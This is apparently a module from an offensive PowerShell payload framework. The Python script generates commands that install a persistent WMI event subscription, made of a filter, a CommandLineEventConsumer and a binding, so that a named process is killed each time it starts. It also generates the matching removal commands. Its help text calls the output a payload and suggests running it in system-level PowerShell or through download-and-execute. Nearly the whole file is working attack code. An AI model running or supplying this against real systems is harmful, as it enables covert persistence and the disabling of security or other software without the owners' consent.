#!/usr/bin/python
import sys
from support.setting import setting



class create:
    #define info here
    info = '''
This module will build a script for the creation of the WMI objects required to supress a process.  Every time the process with name name indicated starts a WMIC command killing all instances of it will run.  To remove, run the remove lines.

Settings:
Prpcess:           The name of the process to supress.
Filter:            Name of the WMI filter.  
Consumer:          Name of the WMI consumer.
OutputFile:        Filename of the locally generated file.

Once the payload has been generated, either copy and paste the commands into a system level powershell, or download via a powershell download and execute.
''' 
    #create a list of possible options
    option_list=["process","filter","consumer","output_file"]
   

    #initialize variables
     
    process=setting("process","notepad.exe",True,"The process to prevent from starting")   
    filter=setting("filter","",True,"name of WMI filter")   
    consumer=setting("consumer","",True,"name of WMI consumer")
    output_file=setting("output_file","",False,"local output filename")
    
    #initialize power_beacon class
    def __init__(self):
        self.name="process-disabler"
    def run(self) :

        process=self.process.value
        filter=self.filter.value
        consumer=self.consumer.value
        output=self.output_file.value

        data='''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance()
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.Query = "select * from Win32_ProcessStartTrace where ProcessName='%s'"
$instanceFilter.Name = "%s"
$instanceFilter.EventNamespace = 'root\cimv2'
$result = $instanceFilter.Put()
$newFilter = $result.Path
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance()
$instanceConsumer.Name = '%s' 
$instanceConsumer.CommandLineTemplate  = "wmic process where name='%s' delete"
$result = $instanceConsumer.Put()
$newConsumer = $result.Path
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance()
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $newConsumer
$result = $instanceBinding.Put()
$newBinding = $result.Path

''' % (process,filter,consumer,process)

        remove_data= '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete() 
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""' 
([wmi]$x).Delete() 
''' % (filter,consumer,consumer,filter)
        
        if output=='':
            print(data)
            print("\n")
            print("To Remove")
            print("-------------------------------------------")
            print(remove_data)
            return
        else:
            output="output/"+output
            f = open(output,'w')
            f.write(data)
            f.close()
            output=output+"_remove"
            f = open(output,'w')
            f.write(remove_data)
            f.close()
            print("Files have been written...")
            return




